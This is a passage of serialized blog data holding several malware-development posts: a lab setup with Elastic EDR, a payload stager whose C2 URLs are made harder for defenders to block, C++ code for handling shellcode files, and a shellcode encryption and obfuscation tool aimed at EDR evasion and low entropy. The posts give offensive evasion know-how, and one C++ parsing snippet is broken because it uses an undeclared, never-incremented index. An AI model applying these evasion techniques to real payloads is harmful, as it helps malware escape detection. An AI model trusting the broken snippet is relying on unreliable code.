height=\&quot;154\&quot; /&gt;\n20. Login using the DC&#39;s Administrator account, and `check Remember my credentials`:\n    - &lt;Image src=\&quot;images/4e0b65f8df784145b7ed1262414b1773.png\&quot; alt=\&quot;38e8a6c9e5aef066e93f7cda4e39d0c6.png\&quot; width=\&quot;166\&quot; height=\&quot;153\&quot; /&gt;\n21. Now, you should have access to the `hackme` share as Administrator:\n    - &lt;Image src=\&quot;images/5f39354b5b33437f8fd88dbf19bc38d8.png\&quot; alt=\&quot;f8f4971e3b7d30fd419a8aa282a86ddb.png\&quot; width=\&quot;228\&quot; height=\&quot;124\&quot; /&gt;\n\nGreat job! You&#39;ve successfully built the foundation of our lab.\n\nNow, all that&#39;s left is to [add Elastic EDR](#adding-elastic-edr), and your lab setup will be complete!\n\n## Adding Elastic EDR\n\nThis section will teach you how to add Elastic EDR to any machine using [peasead&#39;s elastic-container](https://github.com/peasead/elastic-container).\n\nYou will need Docker to run Elastic EDR. You can run Docker either in a virtual machine (VM) or directly on your host OS. I&#39;ll be using a Ubuntu VM in this guide.\n\n1.  [Installing Docker](#installing-docker)\n2.  [Creating Elastic Container](#creating-elastic-container)\n3.  [All Elastic EDR container options](#all-elastic-edr-container-options)\n\n### Installing Docker\n1\\.  Set up Docker&#39;s `apt` repository.\n\n```python\n# Add Docker&#39;s official GPG key:\nsudo apt-get update\nsudo apt-get install ca-certificates curl\nsudo install -m 0755 -d /etc/apt/keyrings\nsudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc\nsudo chmod a+r /etc/apt/keyrings/docker.asc\n\n# Ubuntu\n# Add the repository to Apt sources:\necho \&quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu $(. /etc/os-release &amp;&amp; echo \&quot;$VERSION_CODENAME\&quot;) stable\&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\nsudo apt-get update\n\n# Kali Linux\n# Add the repository to Apt sources:\necho \&quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian bookworm stable\&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\nsudo apt-get update\n```\n\n2\\.  Install Docker&#39;s packages.\n\n```\nsudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin\n```\n\n3\\.  Verify that the installation is successful by running the `hello-world` image:\n\n```\nsudo docker run hello-world\n```\n\n4\\.  Optional, Grant the `docker` right to the default user.\n\n```\nsudo groupadd docker\nsudo usermod -aG docker $USER\n```\n\n### Creating Elastic Container\n\n1\\.  Install elastic container pre-requisites:\n\n```bash\nsudo apt-get install jq git curl\n```\n\n2\\.  Clone the Git repository and navigate to the Elastic container directory:\n\n```bash\ngit clone https://github.com/peasead/elastic-container.git\ncd elastic-container\n```\n\n3\\.  Edit the file `.env` and change the following settings:\n\n```\nELASTIC_PASSWORD=\&quot;changeme\&quot;\nKIBANA_PASSWORD=\&quot;changeme\&quot;\nWindowsDR=1\nLICENSE=trial # enable 30-day free trial with the platinum features (EDR)\n```\n\n4\\.  Run `elastic-container.sh`.\n\n```\nchmod +x ./elastic-container.sh\nsudo ./elastic-container.sh start\n```\n\n5\\.  Click on the 3 horizontal lines, scroll down, and click on `Fleet`.\n\n- &lt;Image src=\&quot;images/5ead1c8e225c45fc8268866317530a0a.png\&quot; alt=\&quot;f4eb1b92bd1aed2dda843a48c5ade678.png\&quot; width=\&quot;127\&quot; height=\&quot;166\&quot; /&gt;\n\n6\\.  Select `Add agent`.\n    \n- &lt;Image src=\&quot;images/ea0fbe25a58a452ca9601bddcbcf3a5b.png\&quot; alt=\&quot;136c8c136331b5d6cd49e34d63c50367.png\&quot; width=\&quot;452\&quot; height=\&quot;79\&quot;/&gt;\n\n7\\.  Scroll down to `Install Elastic Agent on your Host`, select `Windows` and copy the PowerShell script.\n    \n- &lt;Image src=\&quot;images/b0bd05b2753e44d784cfc80b8df20068.png\&quot; alt=\&quot;1955eef6fe48a9d45be6908967e34003.png\&quot; width=\&quot;251\&quot; height=\&quot;149\&quot; /&gt;\n\n8\\.  Now, go to each machine from the AD Lab, and follow these steps:\n    \n-  Copy the URL from the PowerShell script and paste it into your browser to download the .zip file faster.\n    - &lt;Image src=\&quot;images/8d7b349a13ed4344a85d408d274b4618.png\&quot; alt=\&quot;2da87a8f0f7690946b8e9635af831a69.png\&quot; width=\&quot;528\&quot; height=\&quot;46\&quot; /&gt;\n-  Once downloaded, extract the contents of the `.zip` file.\n-  Run `elastic-agent.exe` using the arguments provided in the PowerShell script.\n- If you encounter a certificate trust error, add the `--insecure` flag to solve it.\n\n9\\.  Now, you should see your machines in the Fleet section of Elastic EDR:\n    \n- &lt;Image src=\&quot;images/dc4f9ecab32f469e9687236350d945de.png\&quot; alt=\&quot;9d5747d4e5cc9a5c720fa2d413034eed.png\&quot; width=\&quot;474\&quot; height=\&quot;127\&quot; /&gt;\n\n### All Elastic EDR container options\n\n```\n# Start\n./elastic-container.sh start\n# Destroy Containers\n./elastic-container.sh destroy\n# Stop\n./elastic-container.sh stop\n# Restart\n./elastic-container.sh restart\n# Status\n./elastic-container.sh status\n# Clear all logs\n./elastic-container.sh clear\n```\n\n## Conclusion\n\nCongratulations! You now have your own fully functional malware lab with Elastic EDR.\n\nI hope this guide was helpful and easy to follow. If you have any questions, feel free to reach out to me directly.\n\nHappy hacking!\n\n## References\n\n- [swisskyrepo&#39;s Elastic EDR Post](https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/elastic-edr/)\n- [TCM Security&#39;s Ethical Hacking Course](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course)\n- [peasead&#39;s elastic-container](https://github.com/peasead/elastic-container)&quot;],&quot;filePath&quot;:[0,&quot;src/content/posts/how-to-build-malware-lab-elastic-edr.mdx&quot;],&quot;digest&quot;:[0,&quot;09a56db8404acfb4&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;posts&quot;],&quot;slug&quot;:[0,&quot;how-to-build-malware-lab-elastic-edr&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/malware-testing-lab.FpYsyurl.png&quot;],&quot;width&quot;:[0,1285],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;dynamic-https-payload-stager.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Dynamic HTTP/s Payload Stager&quot;],&quot;date&quot;:[3,&quot;2024-09-12T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/dynamic_payload_stager.png&quot;],&quot;tags&quot;:[1,[[0,&quot;Payload Stager&quot;],[0,&quot;C++&quot;],[0,&quot;Python&quot;],[0,&quot;EDR Evasion&quot;],[0,&quot;Red team&quot;],[0,&quot;Malware Development&quot;],[0,&quot;C&quot;],[0,&quot;Hacking&quot;],[0,&quot;Programming&quot;],[0,&quot;Encryption&quot;],[0,&quot;Obfuscation&quot;],[0,&quot;Malware&quot;]]],&quot;description&quot;:[0,&quot;A dynamic HTTP/S stager that lets one shellcode loader be reused for different encrypted payloads - no rebuilds.&quot;],&quot;featured&quot;:[0,0],&quot;repo&quot;:[0,&quot;andrecrafts/Dynamic-HTTP-Payload-Stager&quot;],&quot;stars&quot;:[0,19],&quot;projectSlug&quot;:[0,&quot;andrecrafts/Dynamic-HTTP-Payload-Stager&quot;]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\nimport Video from &#39;src/components/VideoLocal.astro&#39;;\n\n## Introduction\nWhen testing C2 frameworks I kept rebuilding shellcode loaders to update decryption variables (e.g., keys), which was slow and inconvenient. \n\nTo fix this I built a dynamic HTTP/S stager that lets a single loader be reused across different encrypted payloads without rebuilding.\n\n## Demo\n\nTo use the Dynamic HTTP/s Stager, you only need to configure three parameters:\n\n- The number of variables\n- The URL to the hosted file\n- The delimiter used in the Python script\n\nYou can view all the code in [GitHub](https://github.com/andrecrafts/Dynamic-HTTP-Payload-Stager).\n\nHere&#39;s a video demo showing the Payload stager in action:\n\n&lt;Video src=\&quot;video_demo_http-stager.mp4\&quot; frameborder=\&quot;0\&quot; loop={true} muted={true} /&gt;\n\n## How it works\n\nA small Python tool packages the decryption parameters (key, IV, etc.) into a single Base64-encoded file you host. Each line uses the format `&lt;name&gt;&lt;delimiter&gt;&lt;hex&gt;` (two hex characters = one byte). \n\nAt runtime, the stager fetches the file, splits each line on the delimiter, decodes the Base64 content, converts hex pairs into bytes, and loads them into memory. \n\nThis allows the same loader to decrypt different payloads on demand - no rebuilds or redeployments required.\n\n\n## File Format and Python Script\n\nThe text file containing these variables must adhere to a specific format to ensure compatibility with the stager:\n\n```python\n# Format\n&lt;variable name&gt;-&lt;hexadecimal code&gt;\n```\n\nTo simplify converting variables generated by WafflesCrypt into the required format, I created a Python script that handles this conversion. By default, the delimiter is set to -, but this can be customized as needed. \n\nYou can view the Python script here: [ConvertToFormat.py](https://github.com/WafflesExploits/Dynamic-HTTP-Payload-Stager/blob/main/ConvertToFormat.py).\n\nAfter generating the file, host it on a web server. For quick hosting, use the built-in Python HTTP server with the command:\n\n```bash\npython -m http.server 8080\n```\n\nAlternatively, you can use my enhanced version of the http.server module, httpserver-plus, which offers additional features like HTTPS support and customizable route handling for redirection.\n\n\n## Enhancing the Stager’s Flexibility\n\nThe current HTTP Stager relies on a specific URL. If this URL or domain is blocked by defensive measures, the payload will cease to function. \n\nTo mitigate this, I thought of two potential solutions:\n- [Generating Dynamic, Single-Use URLs](#generating-dynamic-single-use-urls)\n- [Storing Multiple Domains in Arrays and Obfuscating with IPv4Fuscation](#storing-multiple-domains-in-arrays-and-obfuscating-with-ipv4fuscation)\n\nThese solutions are also effective for C2 callbacks when designing implants.\n\n### Generating Dynamic, Single-Use URLs\n\nCreating dynamic, single-use URLs makes it more difficult for defenders to detect, block, or reuse URLs. \n\nHere are some techniques to generate unique, one-time URLs:\n\n1. **Time-Based URL Generation**\n    - Use the current timestamp and a secret key to generate a URL valid only for a short period.\n    - The URL could look like: http://example.com/file/1686584376/ABcdEF12...\n2. **Token-Based URL with Expiry**\n    - Generate a unique token for each request, encoding a random key, session ID, and expiration time.\n    - The URL could look like: http://example.com/file?token=YXNkZmFzZGZhc2RmYXM...\n3. **Mathematical Pattern Generation**\n    - Utilize a mathematical pattern to create a predictable but hard-to-reverse sequence.\n4. **Server-Side Session Tracking**\n    - Use a server-side session or database to manage URL validity, mapping each unique URL to an expiration time and client ID.\n5. **Hash Chaining or Rolling Hashes**\n    - Employ a rolling hash or hash chaining to generate evolving, unique URLs for each session.\n\n### Storing Multiple Domains in Arrays and Obfuscating with IPv4Fuscation\n\nInstead of hardcoding a single domain or IP address, you can store multiple potential domains or IP addresses in an array:\n```c++\nconst char* domains[] = {\n    \&quot;http://example1.com\&quot;,\n    \&quot;http://example2.net\&quot;,\n    \&quot;http://example3.org\&quot;,\n};\n```\n\nAdditionally, you can use IPv4/IPv6 obfuscation methods, as demonstrated in my [Waffles Crypt](/posts/Waffles-Crypt-A-Modular-Approach-to-Shellcode-Encryption-and-Obfuscation-in-C-C++/#create-custom-deobfuscation-functions) post, to make these addresses harder to detect during static analysis.\n\nFor example, converting `http://example1.com` to hexadecimal yields: `68 74 74 70 3A 2F 2F 65 78 61 6D 70 6C 65 31 2E 63 6F 6D.`\n\nThis hexadecimal representation can then be converted to an IP address:\n\n```c++\nconst char* domains[] = {\n    \&quot;104.116.116.112\&quot;,\n    \&quot;58.47.47.101\&quot;,\n    \&quot;120.97.109.112\&quot;,\n    \&quot;108.101.49.46\&quot;,\n    \&quot;0.99.111.109\&quot;\n};\n```\n\n## Conclusion\nThis HTTP Stager streamlines the process of managing encrypted payloads by eliminating the need to constantly regenerate shellcode loaders. \n\nWhile this method can significantly reduce time and effort, it&#39;s important to note that it remains a proof of concept (PoC). From an operational security (OPSEC) standpoint, leaving decryption variables in plaintext isn&#39;t ideal. \n\nA better approach might involve using generic variable names, like a, b, c, and d, since the actual names are irrelevant to the decryption process itself and are only placeholders for the values in arrays.\n\nI hope this post has sparked new ideas or provided valuable insights. I&#39;d love to hear your thoughts, suggestions, or any improvements you might have! Feel free to reach out to me directly.\n\nHappy hacking!&quot;],&quot;filePath&quot;:[0,&quot;src/content/projects/dynamic-https-payload-stager.mdx&quot;],&quot;digest&quot;:[0,&quot;bbde4824d2209e11&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;projects&quot;],&quot;slug&quot;:[0,&quot;dynamic-https-payload-stager&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/dynamic_payload_stager.0vh2wwpQ.png&quot;],&quot;width&quot;:[0,1285],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;store-read-convert-shellcode-in-bin-c-arrays-cpp-and-xxd.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Store, Read, and Convert Shellcode in .bin and C Arrays: C++ and xxd&quot;],&quot;date&quot;:[3,&quot;2024-09-01T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/work_with_shellcode.png&quot;],&quot;tags&quot;:[1,[[0,&quot;Shellcode&quot;],[0,&quot;C++&quot;],[0,&quot;Malware&quot;],[0,&quot;Malware Development&quot;],[0,&quot;Maldev&quot;],[0,&quot;C&quot;],[0,&quot;xxd&quot;],[0,&quot;Linux&quot;],[0,&quot;Hacking&quot;],[0,&quot;Programming&quot;]]],&quot;description&quot;:[0,&quot;Learn to store and read shellcode in .bin files using C++, and quickly convert between .bin files and C arrays with xxd.&quot;],&quot;featured&quot;:[0,0],&quot;projectSlug&quot;:[0]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\n\nWorking with binary files is a fundamental skill in malware development. Whether you&#39;re storing shellcode, encrypting payloads, or integrating binary data into your projects, you need to know how to work with `.bin` files and C arrays.\n\nDespite being essential, many online resources skip over these basics or assume you already know them. This post covers two approaches:\n\n- **C++ code** for storing and reading `.bin` files in your programs:\n    - [Storing shellcode in .bin files (C++)](#storing-shellcode-in-bin-files-c).\n    - [Reading .bin files to retrieve shellcode (C++)](#reading-bin-files-to-retrieve-shellcode-c).\n- **xxd on Linux** for quick conversions between .bin files and C arrays:\n    - [Convert .bin files to C-Style Arrays (xxd)](#convert-bin-files-to-c-style-arrays-xxd).\n    - [Convert C-Style Arrays to .bin files (xxd)](#convert-c-style-arrays-to-bin-files-xxd).\n\n## Storing shellcode in .bin files (C++)\n\n#### Output\n\n&lt;Image src=\&quot;images/9de2ed5ae6ddb5d3f8d237b2ad622d9a.png\&quot; alt=\&quot;Output image\&quot; width=\&quot;306\&quot; height=\&quot;96\&quot;/&gt;\n\n#### Code\n\n```cpp\n#include &lt;iostream&gt;\nint main(int argc, char *argv[]) {\n    // Check for the correct number of arguments  \n    if (argc &lt; 2) {\n        printf(\&quot;Usage: %s &lt;output_filename&gt;.bin\\n\&quot;, argv[0]);\n        return 1;\n    }\n    // Define the variables\n    char* output_file = argv[1];\n    unsigned char shellcode[] = {0x99, 0x12, 0x15, 0x0C}; // Your shellcode goes into here.\n\n    // Open a binary file for writing\n    FILE *file = fopen(output_file, \&quot;wb\&quot;);\n    if (file == NULL) {\n        perror(\&quot;Error opening file\&quot;);\n        return 1;\n    }\n\n    // Write the shellcode to the file\n    fwrite(shellcode, sizeof(shellcode), 1, file);\n\n    // Close the file\n    fclose(file);\n\n    printf(\&quot;Shellcode written to %s\\n\&quot;, output_file);\n    return 0;\n}\n```\n\n## Reading .bin files to retrieve shellcode (C++)\n\n#### Output\n\n&lt;Image src=\&quot;images/16666e48fc4a3a84bb4264ce4f0bda53.png\&quot; alt=\&quot;Output image\&quot; width=\&quot;306\&quot; height=\&quot;96\&quot;/&gt;\n\n#### Code\n\n```cpp\n#include &lt;iostream&gt;\nint main(int argc, char *argv[]) {\n    // Check for the correct number of arguments  \n    if (argc &lt; 2) {\n        printf(\&quot;Usage: %s &lt;input_filename&gt;.bin\\n\&quot;, argv[0]);\n        return 1;\n    }\n    // Define the variables\n    char* input_file = argv[1];\n    \n    // Open the binary file for reading\n    FILE *file = fopen(input_file, \&quot;rb\&quot;); // Opens file with read-mode \&quot;rb\&quot;. \&quot;rb\&quot; is used for non-text files, while \&quot;r\&quot; is used for text files.\n    if (file == NULL) {\n        perror(\&quot;Error opening file\&quot;);\n        return 1;\n    }\n\n    // Find the size of the file\n    fseek(file, 0, SEEK_END); // moves the file pointer to the end of the file.\n    long fileSize = ftell(file); // retrieves the current file pointer position, which is the size of the file.\n    fseek(file, 0, SEEK_SET); // moves the file pointer back to the start so that subsequent read or write operations start from the beginning of the file.\n\n    // Allocate memory to hold the shellcode\n    unsigned char *shellcode = (unsigned char *)malloc(fileSize);\n    if (shellcode == NULL) {\n        perror(\&quot;Memory allocation failed\&quot;);\n        fclose(file);\n        return 1;\n    }\n\n    // Read the shellcode from the file and store it in the \&quot;shellcode\&quot; variable\n    fread(shellcode, fileSize, 1, file);\n\n    // Close the file\n    fclose(file);\n\n    // Print the shellcode as hexadecimal values\n    printf(\&quot;Shellcode read from %s:\\n\&quot;, input_file);\n    for (long i = 0; i &lt; fileSize; i++) {\n        printf(\&quot;0x%02x \&quot;, shellcode[i]);\n    }\n    printf(\&quot;\\n\&quot;);\n\n    // Free the allocated memory\n    free(shellcode);\n\n    return 0;\n}\n```\n\n## Convert .bin files to C-Style Arrays (xxd)\n\nFor quick conversions between `.bin` files and C arrays (like converting a `.bin` payload to use in your code), you can use the xxd tool from the command line.\n\n```bash\nxxd -i file.bin\n```\n\n&lt;Image src=\&quot;images/7b0d4a0179d945f2aecbb3355e482f2f.png\&quot; alt=\&quot;797c8bfbb70f08bbc20d0f8d8ce11dbb.png\&quot; width=\&quot;340\&quot; height=\&quot;218\&quot;/&gt;\n\n## Convert C-Style Arrays to .bin files (xxd)\n\nYou can also perform the reverse conversion, using `sed` and `tr` to transform text files containing C-style arrays back into binary files:\n\n```bash\ncat input.txt | tr -d &#39; \\n&#39; | sed -n &#39;s/.*{ *\\([^}]*\\) *}.*/\\1/p&#39; | xxd -r -p &gt; output.bin\n```\n\n&lt;Image src=\&quot;images/e17fe812b9834e45bd609127d64f2f57.png\&quot; alt=\&quot;5ec894df3e90663bc9ca69a519ebb241.png\&quot; width=\&quot;668\&quot; height=\&quot;243\&quot;/&gt;\n\n## Conclusion\n\nNow you have multiple approaches for working with shellcode in binary files:\n\n- **C++ methods** for when you need programmatic control and integration into larger projects.\n- **xxd on Linux** for quick conversions between binary files and C-style arrays.\n\nEach approach has its place in your malware development workflow. Hope you learnt something new with this! Happy Hacking!&quot;],&quot;filePath&quot;:[0,&quot;src/content/posts/store-read-convert-shellcode-in-bin-c-arrays-cpp-and-xxd.mdx&quot;],&quot;digest&quot;:[0,&quot;5e92333071bec2e7&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;posts&quot;],&quot;slug&quot;:[0,&quot;store-read-convert-shellcode-in-bin-c-arrays-cpp-and-xxd&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/work_with_shellcode.BPYdDllS.png&quot;],&quot;width&quot;:[0,1285],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;waffles-crypt-modular-shellcode-encryption-and-obfuscation.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Waffles Crypt: A Modular Approach to Shellcode Encryption and Obfuscation in C/C++&quot;],&quot;date&quot;:[3,&quot;2024-08-24T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/waffles_crypt_encrypter.png&quot;],&quot;tags&quot;:[1,[[0,&quot;Shellcode Encryption&quot;],[0,&quot;C++&quot;],[0,&quot;Red Team&quot;],[0,&quot;EDR Evasion&quot;],[0,&quot;Malware Development&quot;],[0,&quot;Malware&quot;],[0,&quot;Hacking&quot;],[0,&quot;Programming&quot;],[0,&quot;Encryption&quot;],[0,&quot;Obfuscation&quot;],[0,&quot;EDR Evasion&quot;]]],&quot;description&quot;:[0,&quot;Waffles Crypt is a versatile C/C++ tool for encrypting and obfuscating shellcode.&quot;],&quot;featured&quot;:[0,0],&quot;projectSlug&quot;:[0]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\nimport Video from &#39;src/components/VideoLocal.astro&#39;;\n\nWaffles Crypt is a versatile C/C++ tool for encrypting and obfuscating shellcode. It supports XOR, RC4, and AES encryption, with custom MAC, IPv4, and IPv6-based deobfuscation functions that don&#39;t rely on Windows APIs. \n\nYou can XOR-encrypt your keys and brute-force them at runtime, eliminating the need to store them. \n\nIt also lets you combine these techniques for max evasion!\n\n## Intro\n\nI started this project to practice the encryption and obfuscation techniques I learned with Maldev Academy. My goal was to create a tool that not only allows me to combine these techniques but also generates unique, ready-to-use code each time, ensuring it runs as expected with just a simple copy and paste.\n\nHere are the available options:\n\n- &lt;Image src=\&quot;images/f0ec0798e9bf4d2f88e5d5d36c1c52e9.png\&quot; alt=\&quot;92c669858c8617fd24d13c543be8b130.png\&quot; width=\&quot;568\&quot; height=\&quot;378\&quot; /&gt;\n\n## Waffles Crypt Usage\n\nAs mentioned earlier, you have the flexibility to perform a simple encryption or obfuscation, or you can combine techniques, such as AES encryption with IPv4 obfuscation. You can even apply all available methods together, as illustrated in the image above!\n\nThe program generates files containing the necessary functions for decryption and deobfuscation, as shown below:\n\n- &lt;Image src=\&quot;images/68196bbb076847379a1e6197dea1cbaf.png\&quot; alt=\&quot;e7caaa49fe5389ac98d7833fb1b4f07b.png\&quot; width=\&quot;673\&quot; height=\&quot;175\&quot; /&gt;\n\nHere’s a snippet from the AES decryption file, that uses runtime XOR key brute-forcing and obfuscation:\n\n- &lt;Image src=\&quot;images/c511557a48e6436b9c6a8e1b8e5ef11b.png\&quot; alt=\&quot;00f7e89c45350ac823b3cbe7bece62b4.png\&quot; width=\&quot;624\&quot; height=\&quot;317\&quot; /&gt;\n\nYou can directly copy this code into your Visual Studio project, and it will work seamlessly with newly encrypted shellcode:\n\n- &lt;Image src=\&quot;images/605fb313a85f47138202dbdeb6eec842.png\&quot; alt=\&quot;477789333c65199ac2456ae4137c3333.png\&quot; width=\&quot;603\&quot; height=\&quot;245\&quot; /&gt;\n\n## Making code as modular as Lego\n\nI aimed to make the code as modular as possible for easy reuse.\n\nFor instance, I stored all AES decryption functions in a string named `aes_functions`. This allows me to simply add the `aes_functions` string whenever the script uses AES decryption.\n\n- &lt;Image src=\&quot;images/3e75e584efbd42849a660bcb794fc565.png\&quot; alt=\&quot;c040621f27909606bd3cfe91cc096ff4.png\&quot; width=\&quot;492\&quot; height=\&quot;24\&quot; /&gt;\n\nAnother example is the AES encryption with runtime brute-force key option. I included the `xor_functions` and `bruteforce_key_functions` strings, which are essential for both brute-forcing the key at runtime and decrypting it.\n\n- &lt;Image src=\&quot;images/412d30cc0b7a45048fc5dab132663dc0.png\&quot; alt=\&quot;943563841b1798cb53cd89c6c5ceddfc.png\&quot; width=\&quot;552\&quot; height=\&quot;21\&quot; /&gt;\n\nThis modular approach also proved useful for incorporating the functions needed for deobfuscation, as shown below:\n\n- &lt;Image src=\&quot;images/d5ebbccc28c849f28efb0d6388bcdedf.png\&quot; alt=\&quot;2bee7e184b9094fad5e6ee7daac13482.png\&quot; width=\&quot;393\&quot; height=\&quot;140\&quot; /&gt;\n\n## Using structures to store menu options\n\nTo make the interface more user-friendly, I opted for a menu instead of command-line arguments. However, this made it challenging to store the user-selected options in variables.\n\nThis was particularly true when dealing with numerous individual files in the project, as I did:\n\n- &lt;Image src=\&quot;images/79c2bcc70ec24606ac79e3586ea305ec.png\&quot; alt=\&quot;fb571559046c794e4c28921b82a803b3.png\&quot; width=\&quot;178\&quot; height=\&quot;338\&quot; /&gt;\n\nThe solution I developed was to use a C structure to store all the user&#39;s selected options. This allowed me to pass the structure as a single argument, instead of multiple variables:\n\n- &lt;Image src=\&quot;images/2d4deb8570ee4f25a1f3871e392a4dec.png\&quot; alt=\&quot;9dae1cd099e6dfe8851bfaf4fc12599c.png\&quot; width=\&quot;417\&quot; height=\&quot;111\&quot; /&gt;\n\n## Create Custom Deobfuscation Functions\n\nAs mentioned earlier, I developed custom functions for shellcode deobfuscation.\n\nFor instance, when deobfuscating IPv4-obfuscated shellcode, you might typically use the WinAPI function `RtlIpv4StringToAddressA`. This simplifies the deobfuscation process, as you only need to provide the IPv4 address, and it gets converted back to shellcode.\n\nHowever, relying on such API functions can raise suspicion, as an EDR can easily detect that you&#39;re converting IP addresses into shellcode, an operation that is uncommon in legitimate applications\n\nTo avoid this while retaining the benefits of shellcode obfuscation, I created custom deobfuscation functions, which aren&#39;t particularly difficult to implement.\n\nI wrote these functions in C/C++, which added some complexity. However, using resources like [GeeksforGeeks](https://www.geeksforgeeks.org/how-to-split-a-string-in-cc-python-and-java/), you can easily create your own.\n\nTheoretically, converting an IPv4 address back to shellcode is straightforward if you understand the obfuscation process.\n\nFor example, to convert the shellcode `0x12 0x13 0x14 0x15` into an IPv4 address, you can convert `0x12` to its decimal equivalent and store it using `sprintf` like this:\n\n```c++\n// Function takes in 4 raw bytes and returns them in an IPv4 string format\nchar* GenerateIpv4(int a, int b, int c, int d) {\n   char* Output = (char*)HeapAlloc(GetProcessHeap(), 0, 32);\n   sprintf(Output,\&quot;\\\&quot;%d.%d.%d.%d\\\&quot;\&quot;, a, b, c, d);\n   return (char*)Output;\n}\n\n```\n\nThis would output the IPv4 address `18.19.20.21`.\n\nTo reverse this process, you can split the address by the dots using the [GeeksforGeeks](https://www.geeksforgeeks.org/how-to-split-a-string-in-cc-python-and-java/) tutorial. Then, convert the numeric strings into integers with `atoi()` and store them in an integer array, which would look like this:\n\n```c++\nint main()\n{\n    char str[] = \&quot;18.19.20.21\&quot;;\n\n    // Returns first token \n    char *token = strtok(str, \&quot;.\&quot;);\n    int temp_array[4];\n    // Keep printing tokens while one of the\n    // delimiters present in str[].\n    while (token != NULL)\n    {\n        temp_array[index] = atoi(token);\n        token = strtok(NULL, \&quot;.\&quot;);\n    }\n\n    return 0;\n}\n// temp_array = {18,19,20,21}\n```\n\nNext, you just need to convert the integer to hexadecimal and store it in an unsigned char array. Like so:\n\n```c\nsprintf(temp_char, \&quot;0x%02X\&quot;, temp_array[i]);\n```\n\nUsing this method, you can create your own custom deobfuscation functions!\n\n## Understanding how evasion techniques affect Binary Entropy\n\nThis project also helped me understand which techniques resulted in lower levels of binary entropy.\n\nBinary entropy can serve as an indicator of whether a file is malicious. Malware typically contains a significant amount of shellcode, which is highly random, resulting in high entropy levels compared to benign code. In contrast, files containing structured data, such as English text, show lower entropy due to their more predictable patterns.\n\nBelow is an image from [Practical Security Analytics](https://practicalsecurityanalytics.com/file-entropy/), demonstrating how file entropy can be used for threat detection and hunting.\n\n- &lt;Image src=\&quot;images/e7b93a2444974ac3a0b8f01d8407b852.png\&quot; alt=\&quot;b57341a9fed392e5524407193250cb11.png\&quot; width=\&quot;390\&quot; height=\&quot;323\&quot; /&gt;\n\nSo, maintaining \&quot;good\&quot; entropy values is crucial for staying stealthy.\n\nBelow are the entropy values for various techniques using AES encryption.\n\n- &lt;Image src=\&quot;images/a63979daea5f46eea6a22c40e652ee05.png\&quot; alt=\&quot;e1fd8e63aeb60e4a1bf0953281418d47.png\&quot; width=\&quot;668\&quot; height=\&quot;111\&quot; /&gt;\n\nInterestingly, the technique of brute-forcing the key at runtime had the lowest entropy. This could be due to the smaller amount of code involved. In larger programs, obfuscating the shellcode or combining multiple techniques might yield better results.\n\nAnother finding was that RC4 generally had lower entropy. This makes sense, as TinyAES requires three hexadecimal code arrays (`sbox`, `rsbox`, and `rcon`) as well as the encrypted shellcode, key, and IV; Each contributing to higher entropy levels.\n\n- &lt;Image src=\&quot;images/e45c61193c8d48aaa1714871deeffbc2.png\&quot; alt=\&quot;a6f59805b901966c162f1ac06520248f.png\&quot; width=\&quot;663\&quot; height=\&quot;116\&quot; /&gt;\n\n## Conclusion\n\nWrapping up, this project was not only a lot of fun but also a valuable learning experience. It helped me improve my C/C++ programming skills and gave me a much clearer understanding of various encryption and obfuscation techniques, along with how to strategically combine them for better results.\n\nWhile I can’t share the full project due to the possibility of getting the project code signatured, I hope this breakdown has given you a solid starting point or at least sparked some ideas for your own exploration of encryption/obfuscation techniques.\n\nThanks for following along, and happy 